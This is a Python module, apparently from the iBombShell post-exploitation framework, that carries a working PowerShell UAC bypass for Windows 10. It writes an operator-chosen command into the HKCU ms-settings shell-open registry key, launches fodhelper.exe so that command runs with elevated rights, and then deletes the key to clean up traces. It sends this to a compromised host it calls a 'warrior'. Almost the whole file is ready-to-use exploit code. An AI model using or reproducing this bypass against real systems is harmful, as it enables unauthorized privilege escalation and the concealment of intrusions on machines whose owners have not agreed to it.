from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Bypass UAC - Fileless: invoke-fodhelper",
                       "Description": "Bypass UAC Fileless. Binary: fodhelper.exe on Windows 10",
                       "Author": "@JosueEncinar"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "instruction": [None, "Instruction bypass UAC", False]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """function invoke-fodhelper{ 
    Param (    
    $instruction = "c:\windows\system32\windowspowershell\\v1.0\powershell.exe -C echo pwned > c:\iBombShell.txt" 
        )
    
    $path = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    $key = "DelegateExecute" 
    
    # Creating path
    if(-not(Test-Path -Path $path))
    {
        New-Item $path -Force
    }

    # Registry values
    New-ItemProperty -Path $path -Name $key-Value $instruction -Force
    Set-ItemProperty -Path $path -Name "(default)" -Value $instruction -Force
    

    Start "fodhelper.exe" 
    
    # Removing
    Sleep 2
    rm -Force -Recurse 'hkcu:\Software\Classes\ms-settings\'
}
"""

        if self.args["instruction"]:
            function += 'invoke-fodhelper -instruction "{}" -noDefault'.format(self.args["instruction"])
        else:
            function += 'invoke-fodhelper'
        super(CustomModule, self).run(function)